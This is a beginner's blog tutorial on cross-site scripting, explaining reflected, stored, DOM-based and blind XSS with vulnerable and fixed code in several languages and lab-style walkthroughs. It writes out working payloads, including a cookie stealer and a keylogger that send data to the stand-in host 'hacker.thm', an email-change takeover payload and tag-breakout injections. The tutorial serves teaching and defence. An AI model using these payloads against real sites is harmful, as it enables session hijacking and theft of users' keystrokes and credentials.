---
title: "Cross-Site Scripting ( XSS ) Guide For Beginners 101"
description: "A Client-Side Attack"
date: 2024-09-19
categories: [Blog]
tags: [XSS, Cross-Site Scripting , Client-Side attack , Web Vulnerability]
---

![Image](https://i.imghippo.com/files/9r6ZQ1726753405.gif)

#### <span style="color: Orange;"><b><u># What is XSS? Understanding Cross-Site Scripting Vulnerabilities ?</u></b></span>

Even now, one of the most frequent flaws that endangers web applications is cross-site scripting (XSS). In order to execute on a user's browser, XSS attacks rely on inserting a malicious script inside a legitimate website. Put differently, XSS attacks cause harm because they take advantage of the user's confidence in the weak web application. 

#### <span style="color: Orange;"><b><u># Exploring XSS: How Cross-Site Scripting Puts Websites at Risk ?</u></b></span>

XSS is a vulnerability that allows an attacker to inject malicious scripts into a web page viewed by another user . Consequently , they bypass the Same-Origin Policy ( SOP ); The SOP is a security feature in browsers that stops one website from accessing data from another website unless both are from the same "origin" (i.e., same domain, protocol, and port). This rule is in place to prevent malicious websites from stealing sensitive data like login information or cookies from other sites.

<span style="color: green;"><b>**_For Example_**</b></span>  : Scripts on one origin are prohibited from accessing data from another origin by the same-origin policy. A domain, port number, and URI scheme make up an origin. Take this URL into consideration, for instance: 

`http://normal-website.com/example/example.html`

- This makes use of port 80, normal-website.com, and the http scheme. If content at the aforementioned URL attempts to visit other sources, the same-origin policy will be implemented as shown in the following table:

![[Pasted image 20240917140410.png]](https://i.imghippo.com/files/4Rjgq1726747380.png)

- Certain applications employ a whitelist to manage the websites that are permitted to access their resources through Cross-Origin Resource Sharing, or CORS. The application server verifies if the origin, or the site making the request, is on this whitelist when a request is received. The server grants access by reflecting the origin in the Access-Control-Allow-Origin header if it is permitted. But mistakes are frequently made when building these whitelists, particularly when companies apply broad rules based on URL patterns (prefixes or suffixes) or provide access to all of their subdomains. Security issues may result from this, as attackers may use carelessly applied regulations to create fraudulent domains that mimic legitimate ones.

<span style="color: green;"><b>**_For Example_ :**</b></span>

- If the application allows access to domains ending in `normal-website.com`, an attacker could register `hackersnormal-website.com` to bypass the whitelist.
- If the application allows domains starting with `normal-website.com`, an attacker could use `normal-website.com.evil-user.net`.

#### <span style="color: Orange;"><b><u># What Makes XSS Possible in first place ?</u></b></span>
------------------------------------------------

XSS vulnerabilities can be attributed to a variety of factors in web applications. We've included a handful of them below.

-  <span style="color: pink;">**Insufficient input validation and sanitization**</span> : Web apps utilize user input to create HTML pages dynamically, such as through forms. Because of this, if malicious scripts are not sufficiently cleaned, they may be embedded within valid input and finally be executed by the browser.

- <span style="color: pink;">**Lack of Output encoding**</span> : The way a web browser interprets and presents a web page can be customized by the user using different characters. Characters like <, >, ", ', and & must be correctly encoded into their appropriate HTML encoding for the HTML portion. Particular care should be taken with escape ', ", and \ in JavaScript. A primary source of XSS vulnerabilities is incorrect encoding of user-supplied data.

 -  <span style="color: pink;">**Improper use of security headers**</span>  : XSS vulnerabilities can be reduced with the use of different security headers. By specifying which sources are reliable for executable scripts, Content Security Policy (CSP) reduces the possibility of cross-site scripting attacks. An attacker may find it simpler to carry out their XSS payloads if the CSP is incorrectly set, for example, by using unsafe-inline or unsafe-eval directives incorrectly or with excessively permissive rules.

-  <span style="color: pink;">**Framework and language vulnerabilities**</span> : Certain web frameworks that are older have unpatched XSS vulnerabilities, while others lack security measures to prevent XSS. By design, contemporary modern frameworks avoid cross-site scripting attacks (XSS) and quickly fix vulnerabilities that are found.

- <span style="color: pink;">**Third-party libraries**</span> :  Even in cases when the main web application is secure, the integration of third-party libraries into a web application might result in XSS vulnerabilities.

#### <span style="color: Orange;"><b><u>Beauty XSS Payloads</u></b></span>
-----------------------------------

- A xss payload is nothing just a JavaScript code that we want to execute not he target computer . it basically have to parts 
	1. Intention :- this is what we wish our  payload would do 
	2. Modification  : - what we need to do to complete our intention ( what should we do the change to the code that it execute or intention )

Understanding XSS attacks and customizing them to your requirements requires a fundamental understanding of JavaScript. Here were some of out XSS intentions , some of them you might familiar with ...


##### <span style="color: pink;">**1. Proof of Concept :-**</span>

the payload or technique by which we can demonstrate  that we have achieve an xss on a website . this can include alert box to pop up in most of  the cases . 

```javascript
Example Payload :- <script>alert('xss');</script>
```

- In this above payload .... ^7c662c
	- `<script>` : Is a HTML tag that used to define a client -side script ( in this case , java script ) , or basically means it is used to  executable code or data; typically used to embed or refer to JavaScript code . ^5c8257
	- `alert()` : it is a function that instruct the browser to display a dialog with an optional message or specified message, and to wait until the user dismisses the dialog . 
	- `alert('XSS')` : in this case it create a pop-up box with the specified message 'XSS'
	-  The entire string `<script>alert('XSS');</script>` is the payload that, if successfully injected into a webpage, will be executed by the user's browser, displaying the alert box. This is often used as a Proof of Concept (PoC) to demonstrate that an XSS vulnerability exists.

##### <span style="color: pink;">**2. Session Stealing :-**</span>  
It basically refers where an attacker intercepts and obtains a user's `session ID` , often stored as `cookie` value , to impersonate(to pretend to be someone else ) the user and gain unauthorized access to their account . Below JavaScript code take the target's cookie , encode it using `base64` to ensure successful transmission of the cookie data . Once the attacker have the `Session ID` or `Cookie` value , they can use it to make requests to the server as if they were the legitimate user , bypassing authentication measures .

```javascript
Example Playload :- <script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
```

- In this Above Payload ....
	- `<script>` : is a HTML tag used to define a client-side script  [[#^5c8257|Explained above]]
	- `fetch()` : it is a method in JavaScript , way to retrieve resources from a server . 
	- `fetch('https://hacker.thm/steal?cookie=')` : this send an HTTP request to the specified URL , in this case `https://hacker.thm/steal?cookie=`  , the request includes the stolen cookies as a parameter .
	- `btoa(document.cookie)` : The _btoa()_ method _encodes a string in base-64_ , here its is `document.cookie` ( which contains all the cookies associated with the current website ) . This is done to ensure successful transmission of the cookie data.
	- The entire payload `<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>` will be executed in the user's browser if successfully injected. It sends the user's cookies to the attacker's server (`https://hacker.thm/steal`), allowing the attacker to potentially take over the user's session


##### <span style="color: pink;">**3. Key Logger :-**</span>
This below code functions as a` key logger`. This implies that whatever text you enter on the website will be sent to a website that the hacker is in control of. If the website on which the payload was placed allowed user logins or credit card information, this might be extremely harmful.

```javascript
Example Payload :- <script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>
```

- In this Above Payload ....
	- `<script>` : is a HTML tag used to define a client-side script ... [[#^5c8257|Explained Above]]
	- `document.onkeypress = funtion (e) {...}` :  this sets an event listener that triggers the specified function whenever a key is pressed on the keyboard . 
	- `fetch('https://hacker.thm/log?key=' + btoa(e.key))` : is a JavaScript function that sends an HTTP request to the specified URL, in this case, `https://hacker.thm/log`. The request includes the key that was pressed as a parameter, encoded in _Base64_ format using the `btoa(e.key)` function.
	- The entire payload `<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>` will be executed in the user's browser if successfully injected. It sends the keypress data to the attacker's server (`https://hacker.thm/log`), allowing the attacker to potentially record sensitive information like usernames, passwords, or other confidential data.


##### <span style="color: pink;">**4. Business Logic :-**</span>
A business logic vulnerability refers to a flaw or weakness in a system's design or implementation that allows an attacker to manipulate the system's intended behavior in a way that leads to unauthorized access, data leakage, or other malicious outcomes. This type of vulnerability often involves exploiting the intended functionality of an application or service in an unintended way, rather than directly targeting technical weaknesses like input validation errors or outdated software.

<span style="color: green;"><b>**_For Example_**</b></span> , Consider a business or  eCommerce site has the _password reset_ functionality , where an JavaScript function is responsible for changing the user's email address called `user.changeEmail()` , an attacks can *modify/craft*  a payload , that can change the email address or perform a _password reset attack_. 

```JavaScript
Payload Example :- <script>user.changeEmail('attacker@hacker.thm');</script>
```

- There can be so many intentions and their modification varies according the security level and the code we want to execute or change . 

-> If you find you want more understanding  and experiment with JavaScript code , you can use console for that purpose built in your browser , which can be found under Web Developer Tools on Firefox , Developer Tools on chrome , and Web Inspector on Safari  , hmm i use Firefox or brave by the way .

```
Here are some shortcuts for these :

- On Firefox, press Ctrl + Shift + K
- On Google Chrome, press Ctrl + Shift + J
- On Safari, press Command + Option + J
```

+ as of this post , we might come against some functions like `alert()` , `console.log()` , `atob("base64_string")` .....here is breakdown for you ...

	- `alert()` : A JavaScript alert can be displayed in a web browser by using the alert() method. Try alert('XSS') or alert(1).

	- `console()` : Similar to this, console.log() can be used to show a value in the JavaScript console of the browser. To see a number or a text string displayed, try the following two examples in the console log: console.log(1) and console.log("test text").
	
	- Encoding : A binary string can be encoded to produce an ASCII string that is base64-encoded using the JavaScript function `btoa("string")`. This can be used to encode other alphabets or delete special letters and white space. The function `atob("base64_string")` is the opposite.

- Now we are going to cover the different types of XSS Vulnerabilities, all requiring slightly different attack payloads and user interaction :
  1. [Reflected XSS](#reflected-xss)
  2. [Stored XSS](#stored-xss-)
  3. [DOM Based XSS](#dom-based-xss-)

#### <span style="color: Orange;"><b><u>Reflected XSS</u>🪞</b></span>
------------------------


When user-supplied data from an HTTP request is included on the webpage, this is known as "reflected XSS." ( in other words , Reflected XSS occurs when an application receives data from an HTTP request and uses an unsafe method to include that data in the instant response. .)

<span style="color: green;">**Example Scenario :-**</span>

- Consider a website where we enter incorrect input and an error message is displayed , but the content of the error message get taken form the error parameter in the query string and is build directly in to the page source 

![[Pasted image 20240915095118.png]](https://i.imghippo.com/files/rD98A1726747376.png)

- What if , application doesn't check the contents of the error parameter , that give attacks  an privilege to insert malicious code . 

![[Pasted image 20240915095809.png]](https://i.imghippo.com/files/uz8dF1726747377.png)

- this vulnerability can be utilize in the below image scenario : 

![[Pasted image 20240915093704.png]](https://i.imghippo.com/files/CEUpY1726747366.png)

-  XSS can be found on different languages and frameworks , we are discussing the vulnerable code for the following :

	- PHP
	- JavaScript(Node.js)
	- Python ( Flask )
	- C# ( ASP.NET )

##### <span style="color: yellow;"><b>PHP</b></span>
---------------

- Let's see this Vulnerable Code , what make it vulnerable to reflected xss . 

![[Pasted image 20240917144426.png]](https://i.imghippo.com/files/bEcBc1726747366.png)

if you don't know PHP , Values from the query string of the URL are stored in the PHP array `$_GET.` For instance, the value of `$_GET['q']` in the URL` http://shop.xyz/search.php?q=table` is "table."

The search value (q) is shown on the results page without being properly sanitized, which creates this vulnerability. This implies that malicious code could be added to the URL by an attacker and run when the page loads.  
  
For instance, if the website is vulnerable and an attacker uses the URL` http://shop.xyz/search.php?q=<script>alert(document.cookie)</script>`, the script will execute and produce an alert box displaying the user's cookies, which might be exploited maliciously. An illustration of a Cross-Site Scripting (XSS) attack is this.


>To understand a vulnerability deeply, it's beneficial to know how to exploit it and subsequently, how to fix it. This approach provides comprehensive understanding.
{: .prompt-info }

Here's how we can fix this code , 

![[Pasted image 20240917145623.png]](https://i.imghippo.com/files/zJS0t1726747373.png)

Special characters can be transformed into HTML entities using the PHP method `htmlspecialchars()`. The default replacement of the characters \, >, &, ",'stops scripts in the input from running. Its documentation is available here.

##### <span style="color: yellow;"><b>JavaScript ( Node.js )</b></span>
----------------------------------

- Here Node.js code snippet is vulnerable to xss , let's see what make it vulnerable :

![[Pasted image 20240917164544.png]](https://i.imghippo.com/files/f5Sa31726747373.png)

The code in Node.js makes use of Express, a popular framework for creating web apps. The value of the q argument is extracted from the URL by the `req.query.q.` For instance, the value of `req.query.q` in the URL` http://shop.thm/search?q=table` is "table."

The search word entered by the user is added to a message such as `"You searched for:"` to generate the response. This implies that the answer will contain whatever the user specifies in the `q `parameter. If the input isn't handled properly, it could open the door for potential vulnerabilities, such as `Cross-Site Scripting (XSS).`

- Here's how we can fix this code by adding user input sanitization :

![[Pasted image 20240917165651.png]](https://i.imghippo.com/files/kMeSV1726747369.png)

Cross-Site Scripting ( XSS ) vulnerabilities can be avoided by utilizing the `sanitizeHtml()`method from the sanitize-html package. By eliminating dangerous components like `<script>` tags that an attacker could employ to execute malicious code , this method cleans the input . 

Employing the `escapeHtml()` method is an additional choice . It does this by transforming special characters like`\,>,&,",and '`  safe versions so they cannot be exploited to run malicious code , as opposed to eliminating parts .

##### <span style="color: yellow;"><b>Python ( Flask )</b></span>
-------------------

- Here is Python code vulnerable to XSS , Let's see what makes it vulnerable 

![[Pasted image 20240917173143.png]](https://i.imghippo.com/files/pyH0d1726747372.png)

The query string parameters are retrieved from the URL using Flask's `request.args.get()` method. In` http://shop.thm/search?q=table,` for instance,` request.args.get("q")`returns the value "table."  
  
The problem is that the value that was obtained from the user is entered into the HTML response without first being cleaned up or escaped. Thus, malicious code might be added to the URL by an attacker. Using the URL `http://shop.xyz/search?q=<script>alert(document.cookie)</script>`, for example, this malicious script will run and display an alert using the user's cookies if the website is susceptible.  
  
This could be a vulnerability for Cross-Site Scripting (XSS).

- Here's how we can fix this code by adding user input sanitization :

![[Pasted image 20240917173549.png]](https://i.imghippo.com/files/xCrRk1726747378.png)

The key change here is that user input is now escaped using the `escape()` function from the **html** module. In Flask, `html.escape()` is just an alias for `markupsafe.escape()`, both of which come from the Werkzeug library.

The purpose of this function is to make sure unsafe characters like `<`, `>`, `"`, and `'` are converted into safe HTML entities. This prevents any malicious code inserted by a user from being executed, effectively disarming potential attacks like **Cross-Site Scripting (XSS)**.

##### <span style="color: yellow;"><b>ASP.NET</b></span>
-----------

- Here is `ASP.NET` code vulnerable to XSS , Let's see what makes it vulnerable .

![[Pasted image 20240917173728.png]](https://i.imghippo.com/files/jyTSP1726747364.png)

For those who are not familiar with` ASP.NET` and `C#`,` Request.QueryString `is used in the code above to return a collection of related string keys and values. We store the value connected to the key `q` in the above example in the variable user Input since we are interested in it. Lastly, the user Input is added to another string to create the response.

- Here's how we can fix this code by adding user input sanitization :

![[Pasted image 20240917174333.png]](https://i.imghippo.com/files/wd6bM1726747370.png)

Once more, the answer is to encode user input into strings that are safe for HTML. The `HttpUtility.HtmlEncode()` method in ASP.NET C# is capable of converting different characters, including <, >, and &, into the appropriate HTML entity encoding.

<span style="color: purple;">**What are the Potential Impact of Reflected XSS :**</span>

- Perform any action within the application that the user can perform . 
- An attacker can control a script that can be executed in the victim's browser , to fully compromise that user . 
- Potential victims may get links from the attacker or be embedded into an iframe on another website that has a JavaScript payload. This would cause the victims' browsers to run code, which could leak session or customer information.

<span style="color: purple;">**Where to test for Reflected XSS :**</span>

- Every Parameters in the URL Query String 
- URL File Path
- Sometimes HTTP Headers
- Submit random alphanumeric values ( it will check the input validation , but it needs to be long enough )
- Determine the reflection context .  ( with in the response where random value is reflected , determine its context  )
- Test with the alternative payloads ( means [xss payloads](https://github.com/payloadbox/xss-payload-list) )

After determining whatever data is reflected in the web site, you must verify that your JavaScript payload can be executed properly. The payload you choose will depend on the location of your code's reflection inside the application.


#### <span style="color: Orange;"><b><u>Stored XSS </u>🗄💾</b></span>
------------------------------


As the name suggest _Stored XSS_ occurs when an attacker injects malicious code into a vulnerable web application. The code is then stored in the application and automatically executed for every user who visits the page.

An attacker inserts a malicious script into a web application's input field to initiate stored cross-site scripting (XSS). The way the web application handles the data in the profile information area, forum post, and comment box could be the source of the vulnerability. The malicious script that has been inserted runs in the browsers of other users when they view this cached material. The script has a broad range of capabilities, from taking advantage of session cookies to acting as the user's agent without authorization.


<span style="color: green;">**Example Scenario :-**</span>

A blog page with commenting capabilities. Unfortunately, there is no way to filter out harmful code or determine whether these comments contain JavaScript. In the event that we subsequently publish a remark that includes JavaScript, it will be saved in the database and executed by all subsequent users who access the article.

![[Pasted image 20240915103549.png]](https://i.imghippo.com/files/0E8S11726747372.png)

- Let's use  vulnerable code snippets in PHP  and JavaScript  , as for now to understand how does it work , 

##### <span style="color: yellow;"><b>PHP</b></span>
--------------
- Let's take a code snippet that has multiple vulnerabilities , and it has functionalities like :
	- Read a comment from the user and save it in the `$comment` variable 
	- Adds the `$comment` to the column `comment` in the table `comments` in a database . 
	- Later , it iterates over all the rows in the column `comment` and displays the on screen .

![[Pasted image 20240917182935.png]](https://i.imghippo.com/files/gaAKT1726747375.png)

<span style="color: pink;">**Storing User Input**</span>: Without any sanitization or escape, the user's comment is taken straight from `$_POST['comment'] `and added to the database. This implies that a malicious script such as  `<script>alert('xss')</script>` submitted by an attacker will be stored in the database . 
  
<span style="color: pink;">**Displaying User Input**</span>: Raw input is output without any sanitization or escape when comments are fetched and displayed `(echo $row['comment']).` In the event that a malicious script was saved, it would be run when the page is accessed, possibly impacting every user that visits it.

- Here's how we can fix this code by adding user input sanitization :

![[Pasted image 20240917183512.png]](https://i.imghippo.com/files/vMB281726747363.png)

We feed each comment via the `htmlspecialchars()` function to make sure any special characters are transformed to HTML entities before showing it on the screen. As a result, any attempt at storing cross-site scripting won't reach the browser of the end user.  
  
While this is outside the purview of this session, in case you are wondering how to mitigate the SQL injection vulnerability, you can use the `mysqli_real_escape_string()` function. To ensure its safe usage in a SQL query, this function escapes special characters present in the input string.

##### <span style="color: yellow;"><b>JavaScript ( Node.js )</b></span>
-----------------------
- The JavaScript code that follows reads a user remark that was stored in a database table. It is assumed that the database has been used to populate the comments array. Let's Find out why it is susceptible to stored XSS and how to fix it.

![[Pasted image 20240917184702.png]](https://i.imghippo.com/files/fIIOn1726747379.png)

Displaying User Input: Without any sanitization or escaping, string interpolation`(<li>${comment}</li>)` is used to insert the user comments (stored in the comments array) straight into the HTML. A malicious script such as `<script>alert('XSS')</script>` submitted by an attacker will be placed in to the HTML . 
  
<span style="color: skyblue;"><b>XSS Attack</b></span>: The malicious script will be launched in the browser when the page loads, perhaps stealing user data or having other negative consequences. This is an illustration of stored cross-site scripting (XSS), in which the malicious script is loaded into the program and runs each time the page is accessed.

- Here's how we can fix this code by adding user input sanitization :

Sanitizing the HTML before presenting it to the user is one aspect of the solution . The `sanitizeHTML()` function can be used to remove HTML components that are not in the allowlist . Basic text formatting like bold and italic ( and ) **_should generally be permitted, but components like_** `<script` and `<onload` that could be harmful or unsafe should be removed visit its official page for more details . 

<span style="color: purple;">**What are the Potential Impact of Stored XSS :**</span>

- The malicious JavaScript could redirect users to another site, steal the user's session cookie, or perform other website actions while acting as the visiting user.
- If an attacker can control a script that is executed in the victim's browser, then they can typically fully compromise that user.

<span style="color: purple;">**Where and How to test for Stored XSS :**</span>

- It is necessary to examine all potential points of entry where it appears that data is saved and subsequently shown in locations accessible to other users
- Such as , comment on the blog
- User Profile Information
- Website Listings .
- The URL File Path 
- Parameters or other data within the URL query string and message body.

<span style="color: purple;">**Practices to Prevent Stored XSS Vulnerabilities  :**</span>

1. *Validate and Sanitize Input* :  Establish unambiguous guidelines and rigorously validate all data provided by users. For example, a username can only have alphanumeric characters, and age fields can only contain integers.
2. *Use Output Escaping* : When displaying user-supplied input within an HTML context, encode all HTML-specific characters, such as `<`, `>`, and `&`.
3. *Apply Context-Specific Encoding* :  Thus, for example, each time we insert data into a JavaScript function, we have to apply JavaScript encoding. However, information inserted into URLs needs to employ appropriate URL-encoding methods, such as percent-encoding. The goal is to stop script injection while maintaining the validity of URLs.
4. *Practice defense in depth* :  Use server-side validation rather than depending just on client-side validation to avoid depending on a single line of defense.

Changing values to something the web application wouldn't be expecting is a good way to find stored XSS. For example, an age field that is expecting an integer from a dropdown menu, but you manually send the request rather than using the form that allows you to try malicious payloads. Sometimes developers believe that limiting input values on the client-side is sufficient protection.

Following your discovery of data being saved in the web application, you must verify that your JavaScript payload can be executed properly. The payload you choose will depend on the location of your code's reflection inside the application.


#### <span style="color: orange;"><b><u>DOM Based XSS</u> 🔗</b></span>
-----------------------------

**What is [DOM](https://www.w3.org/TR/REC-DOM-Level-1/introduction.html) in the first place ??**

- [Document Object Model](https://www.w3.org/TR/REC-DOM-Level-1/introduction.html), or DOM for short, is an XML and HTML programming interface. Programs can alter the page's representation in order to modify the document's content, style, and organization. A web page is a document that can be viewed as the HTML source or as something that is shown in the browser window. Below is a representation of the HTML DOM diagram:
	- The DOM is a programming API for documents. It closely resembles the structure of the documents it models. For instance, consider this table, taken from an HTML document:

```
 <TABLE>
      <TBODY> 
      <TR> 
      <TD>Shady Grove</TD>
      <TD>Aeolian</TD> 
      </TR> 
      <TR>
      <TD>Over the River, Charlie</TD>        
      <TD>Dorian</TD> 
      </TR> 
      </TBODY>
      </TABLE>
```

- The DOM represents this ( similarly ) table like this :

![[Pasted image 20240915110600.png]](https://i.imghippo.com/files/ufOvg1726747378.png)

- DOM-based XSS Vulnerability arise When JavaScript transfers data from an attacker-controllable source, like the URL, to a sink that permits dynamic code execution, like eval() or innerHTML, DOM-based XSS vulnerabilities typically materialize. This gives hackers the ability to run malicious JavaScript, which usually lets them take control of other people's accounts.

<span style="color: Green;">**Example Scenario**</span>

- The URL is the most frequent source of DOM XSS, and the `window.location `object is usually used to access it. An attacker can create a link and fragment parts of the URL to direct the victim to a page that is vulnerable and contain a payload in the query string. The payload can also be put in the path in specific situations, such when aiming for a 404 page or a PHP website. 

The rationale is that DOM-based XSS doesn't require a server visit and return to the client; instead, it operates entirely within the browser. A static HTML page could once be used to produce a proof of concept, but DOM-based XSS has become very challenging due to web browsers' increased built-in protection.

- The DOM has a tree like structure, allowing developers to use JavaScript code to search it or modify specific elements .  Let's see how it works

```html
<html> 
	<head> 
		<title>Hello World!</title>
	 </head> 
	 <body> 
		 <h1> Hello Moon! </h1>
		 <p> The earth says hello! </p>
	 </body> 
</html>
```

let's look at the element tab in the console , it had a tree like structure , and `document` element is always the head of the tree. The entire loaded webpage's HTML code, which is separated into the head and body sections, resides in the subtree html.

![[Pasted image 20240918094423.png]](https://i.imghippo.com/files/t2UPl1726747371.png)

let's modify the DOM , <span style="color: Green;">**for example**</span> , we can create a new element in the DOM using :
	1. First we have to open the console .
	2. The we have to create a new paragraph using paragraph element
		`const paragraph = document.createElement("p");`
	3. then create a text that will go inside the paragraph
		`const data = document.createTextNode("Our new text");`
	4. now add our text to the paragraph
		`paragraph.appendChild(data);`
	5. now we will append the new paragraph , now we can find an existing paragraph on the webpage to attack to our new paragraph . 
		 `document.getElementByTagName("p")[0].appendChild(paragraph);`

this is somewhat how DOM based attack lies or works  , if we can inject the code into the DOM then we can alter what the user sees  . 

<span style="color: Green;"><b>An example</b></span> of this is when the developers disabled the "edit" button in JavaScript. However, since you can alter the DOM in your browser, you can re-enable the button and make the request, thus leading to an authorization bypass.

![[Pasted image 20240918095014.png]](https://i.imghippo.com/files/8zM6y1726747367.png)
![[Pasted image 20240918095308.png]](https://i.imghippo.com/files/KXLLc1726747369.png)

Untrusted user input finds its way to JavaScript, which alters the DOM, at the beginning of all DOM-based assaults. We call them sources and sinks to make it easier to identify these problems. The place where a user provides untrusted data to a JavaScript function is called a source, and the place where the data is used by JavaScript to change the DOM is called a sink. If there is no sanitization or validation performed on the data between the source and sink, it can lead to a DOM-based attack.

| Example                                | Source                                                                                | Sink                                                                                                           |
| -------------------------------------- | ------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------- |
| User selecting an item from a dropdown | The value of the selected option in the dropdown is recorded as the user’s selection. | A function retrieves the selected value and updates the page content or sends it to the server for processing. |
| User uploading a file                  | The file selected by the user is read via a file input element.                       | A JavaScript function handles the uploaded file, either displaying a preview or sending it to the server.      |

| **Example**                | **Source**                                                                                                                             | **Sink**                                                                        |
| -------------------------- | -------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------- |
| **1. URL Fragment Attack** | `location.hash` (the part of the URL after the `#` symbol is used as a source)                                                         | `document.write()` (output is written to the page directly without validation)  |
| **Scenario**               | Attacker manipulates the URL to inject malicious content via the hash portion (e.g., `http://example.com/#<script>alert(1)</script>`). | The webpage directly writes the URL fragment to the document, resulting in XSS. |
| **Code**                   | `var hash = location.hash;`                                                                                                            | `document.write(hash);`                                                         |

It is customary to use the # operator in the URL; this is known as a fragment. When you sent a buddy the URL to a blog article you had read, did you ever notice that when they clicked the link, it opened right where you were? This happens because when you read the page, JavaScript code adjusts the # component of the URL to point to the heading that is closest to your current position. This information is transmitted along with the URL; when the blog post loads, JavaScript retrieves it and uses it to automatically scroll the page to your location. Although this improves user experience, if the data injected into the URL is not properly validated, it may result in DOM-based attacks.

- Consider this JavaScript Code as an example :
	`goto = location.hash.slice(1) if (goto.startsWith('https:')) {   location = goto; }`

The location.hash.slice(1) option, which accepts the first # element in the URL, serves as the source in this case. This value is set directly in the sink (DOM) location without any sanitization. To take advantage of the weakness, we can create the following URL:  
`http://www.realwebsite.com#https://attacker.com/` , this can lead to _DOM-based Open Redirection Vulnerability_ 

- We are essentially doing worthless XSS on ourselves if we don't properly weaponize. One major problem with DOM-based XSS is this. Fortunately, weaponization is achievable via the standard XSS routes!

To fully `weaponize XSS`, we first need to realize the power of what we have.We can take control of the user's browser when we are able to fully execute `XSS` and load a staged payload. We can therefore interact with the web application in the same way as a user would. Neither popping an alert nor stealing the user's cookie is necessary. We can provide the browser instructions to make requests on the user's behalf. This is the reason `XSS` is so potent. Even if there isn't actually anything sensitive on the page where you detect `XSS`, you can still tell the browser to change the user's state or retrieve data from other, more vulnerable pages. All we have to do is comprehend the functionality of the program and modify our `XSS` payload to take advantage of and use this feature.

Here is the twitter case study of how a threat actore weaponize the simple DOM based vulnerability to create a worm . Twitter was found to have a DOM-based XSS vulnerability in 2010. Twitter added the following feature in an update to their JavaScript:


```
//<![CDATA[ 
(function(g){var a=location.href.split("#!")[1];if(a)
{g.location=g.HBR=a;}})(window); 
//]]>
```


The function created a source and a sink without conducting adequate data validation and sanitization. In essence, it searched the URL for #! and assigned the content to the window.location object. Therefore, an attacker may use this payload to get the desired pop-up:
`http://twitter.com/#!javascript:alert(document.domain);`

As previously stated, this would be ineffective. Nevertheless, [threat actors](https://archive.f-secure.com/weblog/archives/00002035) weaponized the problem. The `onmouseover` JavaScript method was used to weaponize the vulnerability and produce a worm that would:  
  
- Retweet itself to attract even more followers.  
- send visitors to different websites that may or may not include more harmful payloads.  
- Display pop-ups and other invasive practices that might be used to phish for personal data

At last ,  the weaponised exploit affected thousands of users. Learn more about [weaponizing here](https://labs.withsecure.com/publications/getting-real-with-xss) , A Must Read Blog


<span style="color: purple;">**What are the Potential Impact of DOM-based XSS :**</span>

- Potential victims may receive specially crafted links that take them to another website or steal content from the page or the user's session.

<span style="color: purple;">**Where and How to test for Stored XSS :**</span>

- You'd need to look for parts of the code that access certain variables that an attacker can have control over, such as "**window.location.x**" parameters , for this type of vulnerability you need little bit knowledge of the JavaScript to read the source code .
- Testing HTML sinks  ( Will explain in later or do google about it )
- Testing JavaScript Execution sinks  ( will explain in later or do google it )



#### <span style="color: orange;"><b><u>Blind XSS </u>👩‍🦯👩‍🦯👁️</b></span>
-------------------------

Similar to a stored XSS, blind XSS involves storing your payload on the website for viewing by other users; however, in this case, you are unable to see the payload in action or conduct a test against yourself beforehand. 

<span style="color: green;">**Example Scenario :**</span>

- The attacker's JavaScript might call back to an attacker's website with the appropriate payload, exposing the staff member's cookies, the staff portal URL, and even the contents of the portal page that is being viewed. At this point, the staff member's session could be taken over by the attacker, giving them access to the private portal.

<span style="color: green;">**Where and How to test for Blind XSS :**</span>

- As you check for Blind XSS vulnerabilities, make sure your payload contains a callback, which is typically an HTTP request. You can then determine whether and when your code is being performed.
- For Blind XSS attacks, [XSS Hunter Express](https://github.com/mandatoryprogrammer/xsshunter-express) is a well-liked tool. While you may create your own JavaScript tool, this one will automatically grab URLs, cookies, page contents, and more.
- Or you can use the Burp Suite Collaborator tab to get the callback from your payload


#### <span style="color: orange;"><b><u>Some Example to deal with different Scenarios</u> :</b></span>
----------------------------------------------------------

As we were already know The JavaScript code we wish to run as a proof of concept to show a website vulnerability or on a different user's browser is the payload. Your payload may aim to do anything from simply displaying an alert box informing the user that we can run JavaScript on the target website to actually retrieving data from the webpage or user session.

##### <span style="color: pink;"><b>Level 1</b></span>
-------------------

- consider a webpage that ask for your name as input  , and when you finish and press enter button , you dialog box saying Welcome/Hello <What_Ever_you_Enter>
- On review the source code , you'll see your name reflected in the code: ( as shown below image )
- instead of entering name , we can enter the JavaScript Payload :  `<script>alert('Archtrmntor');</script>`
- Now when we click on the enter button , we will get the alert box  popup with the string saying 'Archtrmntor' 
- Although discovering such vulnerabilities is not always easy, fixing them is straightforward. User input such as `<script>alert('XSS')</script>` should be sanitized or HTML-encoded to `&lt;script&gt;alert('XSS')&lt;/script&gt;`.

![[Pasted image 20240915124554.png]](https://i.imghippo.com/files/biXAK1726747362.png)

- and the page source will look like 

```html
<div class="text-center">
	<h2>Hello, <script>alert('Archtrmntor');<script></h2>
</dev>
```

- this popup indicate us the out payload was successfully executed  .

##### <span style="color: pink;"><b>Level 2</b></span>
-------------------------

- As above level , we have input bot to put our name , but when we enter out standard payload it will show nothing and prints out the payload as 
`Hello, <script>alert('Devin')</script>`
- when we look in the source code ( image below) , we found out this time , out payload or input text goes into the `<input>` value tag , but our text is got reflected in the source code .
- Think it as , first we have to escape the `<input>` tag , by ending it with `">` this will end the tag as `<input value=""><OUR_NEXT_INPUT` , now after this what ever payload we put in that will execute , such as payload : `"><script>alert('Devin');<script>` , 
- closing of `<input>` tag allow our JavaScript payload to run .
- After this we will get an alert popup with `devin` , which indicate successfully execution of our payload .

![[Pasted image 20240915124858.png]](https://i.imghippo.com/files/ae2c21726747361.png)

- source code after our payload got executed .

```html
<div class="text-center">
	<h2>Hello,<input value=""><script>alert('Devin');<script></h2>
</div>
```

##### <span style="color: pink;"><b>Level 3</b></span>
-----------------------

- same as above , we have presented to enter out name , and it prints out it on the screen for us . this time if we enter the above 2 payload they both won't work .
- We first have to verify , how this page is taking input by looking at the source code . 
- Here it take user input in the `<textarea>` tag , so we know from the above challenge
- we first have to close  or escape the `</textarea>` then we can put our payload , 
- Let's craft our payload : `</textarea><script>alert('Archtrmntor');</script>`
- the important this of the above payload is to escape `</textarea>` 
- then we click on the enter button , we will get the alert popup with the string '_Devin_'


![[Pasted image 20240915132409.png]](https://i.imghippo.com/files/7CvRj1726747365.png)

- Code after our payload got executed 

